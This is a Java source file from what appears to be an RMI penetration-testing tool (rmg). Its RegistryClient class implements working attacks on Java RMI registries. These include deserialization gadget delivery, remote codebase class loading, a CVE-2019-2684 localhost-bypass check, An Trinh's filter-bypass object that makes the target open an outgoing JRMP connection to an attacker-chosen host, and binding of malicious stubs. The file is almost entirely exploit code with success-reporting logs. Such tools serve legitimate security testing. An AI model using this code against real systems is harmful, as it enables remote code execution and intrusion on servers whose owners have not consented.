package de.qtc.rmg.operations;

import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import javax.management.remote.rmi.RMIServerImpl_Stub;

import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.DummySocketFactory;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;


/**
 * The RegistryClient class provides different methods to communicate with an RMI registry. The supported RMI
 * calls are dispatched manually, which allows modifications on the call level. The RMI target is taken from the
 * supplied RMIWhisperer, which allows to skip all the TLS and host redirection stuff.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class RegistryClient {

    private RMIWhisperer rmi;
    private Field enableReplaceField;

    private static final long interfaceHash = 4905912898345647071L;
    private static final String[] callNames = new String[] {"bind", "list", "lookup", "rebind", "unbind"};
    private static final long[] hashCodes = new long[] {7583982177005850366L, 2571371476350237748L, -7538657168040752697L, -8381844669958460146L, 7305022919901907578L };

    /**
     * Initializes the class and makes some required fields accessible by using reflection. These fields are
     * actually only required by some of the provided functions and the reflection is contained within the constructor
     * for legacy reasons. However, it shouldn't hurt.
     *
     * @param rmiRegistry RMIWhisperer object that represents the targeted RMI registry
     */
    public RegistryClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;

        try {
            enableReplaceField = ObjectOutputStream.class.getDeclaredField("enableReplace");
            enableReplaceField.setAccessible(true);

        } catch(SecurityException | NoSuchFieldException e) {
            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "RegistryClient", "instantiation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }
    }

    public void bindObject(String boundName, String host, int port, boolean localhostBypass)
    {
        Logger.printMixedBlue("Binding name", boundName, "to TCPEndpoint ");
        Logger.printlnPlainBlue(host + ":" + port);
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        try {
            payloadObject = generateRMIServerImpl(host, port);
        } catch(Exception e) {
            Logger.printlnYellow("Internal error: Unexpected " + e.getClass().getName() + "during bindObject call.");
            RMGUtils.showStackTrace(e);
            RMGUtils.exit();
        }

        try {
            bindCall(boundName, payloadObject, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during bind call.");
            Logger.printlnMixedYellow("Bind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("Registry", "rejected bind call", "cause it was not send from localhost.");

                if(!localhostBypass)
                    Logger.eprintlnMixedBlue("You can attempt to bypass this restriction using the", "--localhost-bypass", "option.");
                else
                    Logger.eprintlnMixedBlue("Localhost bypass", "failed.");

                RMGUtils.showStackTrace(e);

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Bind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else if( t instanceof java.rmi.AlreadyBoundException) {
                Logger.eprintlnMixedYellow("Bind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the boundname", boundName, "is already bound.");
                Logger.eprintlnMixedYellow("Use the", "rebind", "action instead.");

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during bind call.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
            }

        } catch( java.rmi.AlreadyBoundException e ) {
            Logger.eprintlnMixedYellow("Bind operation", "was accepted", "by the server.");
            Logger.eprintlnMixedBlue("But the boundname", boundName, "is already bound.");
            Logger.eprintlnMixedYellow("Use the", "rebind", "action instead.");

        } catch( Exception e  ) {
            Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during bind call.");
            Logger.eprintln("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
        }
    }

    public void rebindObject(String boundName, String host, int port, boolean localhostBypass)
    {
        Logger.printMixedBlue("Rebinding name", boundName, "to TCPEndpoint ");
        Logger.printlnPlainBlue(host + ":" + port);
        Logger.println("");
        Logger.increaseIndent();

        Object payloadObject = null;

        try {
            payloadObject = generateRMIServerImpl(host, port);

        } catch(Exception e) {
            Logger.printlnYellow("Internal error: Unexpected " + e.getClass().getName() + "during bindObject call.");
            RMGUtils.showStackTrace(e);
            RMGUtils.exit();
        }

        try {
            rebindCall(boundName, payloadObject, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during rebind call.");
            Logger.printlnMixedYellow("Rebind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("Registry", "rejected rebind call", "cause it was not send from localhost.");

                if(!localhostBypass)
                    Logger.eprintlnMixedBlue("You can attempt to bypass this restriction using the", "--localhost-bypass", "option.");
                else
                    Logger.eprintlnMixedBlue("Localhost bypass", "failed.");

                RMGUtils.showStackTrace(e);

            } else if( t instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("Rebind operation", "was accepted", "by the server.");
                Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                Logger.eprintln("The server probably runs on a JRE with limited module access.");

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during rebind call.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
            }

        } catch( Exception e  ) {
            Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during rebind call.");
            Logger.eprintln("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
        }
    }

    public void unbindObject(String boundName, boolean localhostBypass)
    {
        Logger.printlnMixedBlue("Ubinding bound name", boundName, "from the registry.");
        Logger.println("");
        Logger.increaseIndent();

        try {
            unbindCall(boundName, false, localhostBypass);
            Logger.printlnMixedBlue("Encountered", "no Exception", "during unbind call.");
            Logger.printlnMixedYellow("Unbind operation", "was probably successful.");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("Registry", "rejected unbind call", "cause it was not send from localhost.");

                if(!localhostBypass)
                    Logger.eprintlnMixedBlue("You can attempt to bypass this restriction using the", "--localhost-bypass", "option.");
                else
                    Logger.eprintlnMixedBlue("Localhost bypass", "failed.");

                RMGUtils.showStackTrace(e);

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during unbind call.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.eprintlnMixedYellow("Caught", "NotBoundException", "during unbind call.");
            Logger.printlnMixedBlue("The name", boundName, "seems not to be bound to the registry.");

        } catch( Exception e  ) {
            Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during unbind call.");
            Logger.eprintln("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
        }
    }

    /**
     * Invokes the .lookup(String name) method of the RMI registry with a malformed codebase address and an
     * Integer as argument. Registry servers that use readObject() for unmarshalling the String type and that
     * are configured with useCodebaseOnly=false will attempt to parse the provided codebase as URL and throw
     * an according exception. With useCodebaseOnly=true, the malformed codebase is read too, but ignored afterwards.
     * This allows to detect whether the server runs with useCodebaseOnly=false.
     *
     * @param marshal  indicates whether the registry server uses readObject() to unmarshall Strings (true)
     * @param regMethod  the registry method to use for the operation (lookup|bind|rebind|unbind)
     */
    public void enumCodebase(boolean marshal, String regMethod, boolean localHostBypass)
    {
        Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        if(!marshal && regMethod == "lookup") {
            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
            Logger.eprintlnMixedBlue("  This prevents", "useCodebaseOnly", "enumeration from remote.");
            Logger.decreaseIndent();
            return;
        }

        MaliciousOutputStream.setDefaultLocation("InvalidURL");

        try {

            callByName(regMethod, 0, true, localHostBypass, "");

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.MalformedURLException ) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "attempted to parse", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                RMGUtils.showStackTrace(e);

            } else if( t instanceof java.lang.ClassCastException ) {
                Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
                Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=true).");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + regMethod + " call.");
                Logger.println("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printlnMixedYellow("- Caught", "ClassCastException", "during " + regMethod + " call.");
            Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
            Logger.printlnPlainYellow("(useCodebaseOnly=true).");
            RMGUtils.showStackTrace(e);

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + regMethod + " call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Determines how the String type is umarshalled by the remote server. Sends a java.lang.Integer as argument
     * for the lookup(String name) call. If the String type is read via readObject(), this will lead to an deserialization
     * attempt of the location, which is set to an unknown object (DefinitelyNonExistingClass). If this class name
     * appears in the server exception, we know that readObject() was used. The readString() method, on the other hand,
     * ignores the location of an object.
     */
    public boolean enumerateStringMarshalling()
    {
        boolean marshal = false;

        Logger.printlnBlue("RMI server String unmarshalling enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        try {
            lookupCall(0, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);
            if( t instanceof ClassNotFoundException && t.getMessage().contains("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                Logger.printlnMixedBlue("- Server", "attempted to deserialize", "object locations during lookup call.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readObject().");
                RMGUtils.showStackTrace(e);
                marshal = true;

            } else if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
                Logger.printlnMixedBlue("- Server complained that", "object cannot be casted to java.lang.String.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readString().");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
                Logger.println("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
            }

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);

        } finally {
            Logger.decreaseIndent();
        }

        return marshal;
    }

    public void enumLocalhostBypass()
    {
        Logger.printlnBlue("RMI registry localhost bypass enumeration (CVE-2019-2684):");
        Logger.println("");
        Logger.increaseIndent();

        try {
            unbindCall("If this name exists on the registry, it is definitely the maintainers fault...", false, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                Logger.eprintlnMixedYellow("- Registry", "rejected unbind call", "cause it was not send from localhost.");
                Logger.eprintlnMixedBlue("  --> Localhost bypass", "was patched", "on this registry server.");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during unbind call.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
            }

        } catch( java.rmi.NotBoundException e ) {
            Logger.eprintlnMixedYellow("- Caught", "NotBoundException", "during unbind call.");
            Logger.printlnMixedYellow("  --> RMI registry processed the unbind call and", "is vulnerable.");
            RMGUtils.showStackTrace(e);

        } catch( Exception e  ) {
            Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during unbind call.");
            Logger.eprintln("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void gadgetCall(Object payloadObject, String regMethod, boolean localHostBypass)
    {
        Logger.println("");
        Logger.printlnBlue("Attempting deserialization attack on RMI registry endpoint...");
        Logger.println("");
        Logger.increaseIndent();

        try {

            callByName(regMethod, payloadObject, false, localHostBypass, "");

        } catch( Exception e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.eprintMixedYellow("RMI registry", "rejected", "deserialization of the supplied gadget");
                Logger.printlnPlainYellow(" (JEP290 is installed).");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("RMI registry", "accepted", "deserialization of the supplied gadget.");
                Logger.eprintlnMixedYellow("However, the gadget seems to be", "not available", "on the servers classpath.");
                Logger.eprintln("Try a different gadget.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printlnMixedYellow("Caught", "ClassCastException", "during deserialization attack.");

                if(regMethod.equals("lookup"))
                    Logger.printlnMixedBlue("The server uses either", "readString()", "to unmarshal String parameters, or");

                Logger.printlnMixedYellowFirst("Deserialization attack", "was successful :)");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
                Logger.printlnMixedYellow("Caught", "RemoteException", "during deserialization attack.");
                Logger.printMixedBlue("This is expected when", "An Trinh bypass", "was used and the server ");
                Logger.printlnPlainYellow("is patched.");

            } else {
                Logger.eprintlnMixedYellow("Caught unexpcted exception during", regMethod, "call.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }

    public void codebaseCall(Object payloadObject, String regMethod, boolean localHostBypass)
    {
        String className = payloadObject.getClass().getName();

        Logger.println("");
        Logger.printlnBlue("Attempting codebase attack on RMI registry endpoint...");
        Logger.print("Using class ");
        Logger.printPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
        Logger.printlnPlainMixedYellow(" during", regMethod, "call.");
        Logger.println("");
        Logger.increaseIndent();

        try {

            callByName(regMethod, payloadObject, false, localHostBypass, "");

        } catch( Exception e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.eprintMixedYellow("Registry", "rejected", "deserialization of class ");
                Logger.printPlainBlue(className);
                Logger.printlnPlainYellow(" (JEP290 is installed)");
                Logger.eprintlnMixedBlue("Make sure your payload class", "extends RemoteObject", "and try again.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.UnsupportedClassVersionError) {
                Logger.eprintlnMixedYellow("Caught", "UnsupportedClassVersionError", "during " + regMethod + " call.");
                Logger.eprintlnMixedBlue("You probably used an", "incompatible compiler", "for class generation.");
                Logger.eprintln("Original error: " + e.getMessage());
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("The payload class could", "not be loaded", "from the specified endpoint.");
                Logger.eprintMixedBlue("The registry is probably configured with", "useCodeBaseOnly=true");
                Logger.printlnPlainYellow(" (not vulnerable)");
                Logger.eprintlnMixedYellow("or the file", className + ".class", "was not found on the specified endpoint.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printlnMixedYellow("Caught", "ClassCastException", "during " + regMethod + " call.");
                Logger.printlnMixedBlue("The server uses either", "readString()", "to unmarshal String parameters,");
                Logger.printlnMixedYellow("or codebase attack", "was successful :)");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.security.AccessControlException) {
                Logger.printlnMixedYellow("Caught unexpected", "AccessControlException", "during " + regMethod + " call.");
                Logger.printlnMixedBlue("The servers", "SecurityManager", "may refused the operation.");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + regMethod + " action.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }

    /*
    * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
    * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
    * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
    *
    * @param host  listener address for the outgoing JRMP connection
    * @param port  listener port for the outgoing JRMP connection
    * @param regMethod  registry Method to use for the call
    */
    public static Object generateBypassObject(String host, int port) throws Exception
    {
        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
        constructor.setAccessible(true);

        Field ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        ssfField.setAccessible(true);

        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));

        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            payloadInvocationHandler);

        UnicastRemoteObject payloadObject = null;
        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
        UnicastRemoteObject.unexportObject(payloadObject, true);

        ssfField.set(payloadObject, proxySSF);
        return payloadObject;
    }

    /**
     * Generates an RMIServerImpl_Stub as it is usually used by JMX instances. The contained TCPEndpoint
     * points to a user controlled address. This can be used for binding a malicious bound name to the
     * RMI registry. Once it is looked up, a JRMP connection is created to the specified TCPEndpoint.
     *
     * @param host  listener host for the outgoing JRMP connection
     * @param port  listener port for the outgoing JRMP connection
     * @return   RMIServerImpl_Stub as used by JMX
     * @throws Exception
     */
    public Object generateRMIServerImpl(String host, int port) throws Exception
    {
        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
        return new RMIServerImpl_Stub(refObject);
    }

    public void callByName(String callName, Object payloadObject, boolean maliciousStream, boolean bypass, String boundName) throws Exception
    {
        switch(callName) {

            case "lookup":
                lookupCall(payloadObject, maliciousStream);
                break;

            case "bind":
                bindCall(boundName, payloadObject, maliciousStream, bypass);
                break;

            case "rebind":
                rebindCall(boundName, payloadObject, maliciousStream, bypass);
                break;

            case "unbind":
                unbindCall(payloadObject, maliciousStream, bypass);
                break;

            default:
                Logger.printlnMixedYellow("Interal error within the", "callByName(...)", "function.");
                RMGUtils.exit();
        }
    }

    private void bindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
    {
        Object[] callArguments = new Object[] {boundName, payloadObject};
        if(bypass)
            genericCall(-1, callArguments, false, "bind");
        else
            genericCall(0, callArguments, maliciousStream);
    }

    private void lookupCall(Object payloadObject, boolean maliciousStream) throws Exception
    {
        Object[] callArguments = new Object[] {payloadObject};
        genericCall(2, callArguments, maliciousStream);
    }

    private void rebindCall(String boundName, Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
    {
        Object[] callArguments = new Object[] {boundName, payloadObject};
        if(bypass)
            genericCall(-1, callArguments, false, "rebind");
        else
            genericCall(3, callArguments, maliciousStream);
    }

    private void unbindCall(Object payloadObject, boolean maliciousStream, boolean bypass) throws Exception
    {
        Object[] callArguments = new Object[] {payloadObject};
        if(bypass)
            genericCall(-1, callArguments, false, "unbind");
        else
            genericCall(4, callArguments, maliciousStream);
    }

    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream) throws Exception
    {
        genericCall(callID, callArguments, maliciousStream, null);
    }

    @SuppressWarnings("deprecation")
    private void genericCall(int callID, Object[] callArguments, boolean maliciousStream, String callName) throws Exception
    {
        long hash = interfaceHash;

        if(callID >= 0) {
            callName = callNames[callID];

        } else if(callName != null){

            for(int ctr = 0; ctr < callNames.length; ctr++) {
                if( callName.equals(callNames[ctr]) ) {
                    hash = hashCodes[ctr];
                    break;
                }
            }

            if( hash == interfaceHash ) {
                Logger.eprintlnMixedYellow("Unable to find method hash for method", callName);
                RMGUtils.exit();
            }

        } else {
            Logger.eprintlnMixedYellow("Internal error in", "genericCall", "function.");
            Logger.eprintlnMixedBlue("Unable to obtain method hash for method", callName);
            RMGUtils.exit();
        }

        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, callID, hash);
            try {
                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                enableReplaceField.set(out, false);

                if(maliciousStream)
                    out = new MaliciousOutputStream(out);

                for(Object o : callArguments)
                    out.writeObject(o);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
                Logger.eprintMixedBlue("Target", "refused", "the connection.");
                Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

        } catch(java.rmi.ConnectIOException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.NoRouteToHostException) {
                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during " + callName + " call.");
                Logger.eprintln("Have you entered the correct target?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during " + callName + " call.");
                Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
                Logger.printlnPlainBlue(" SSL socket.");
                Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during " + callName + " call.");
                Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during " + callName + " call.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }
}
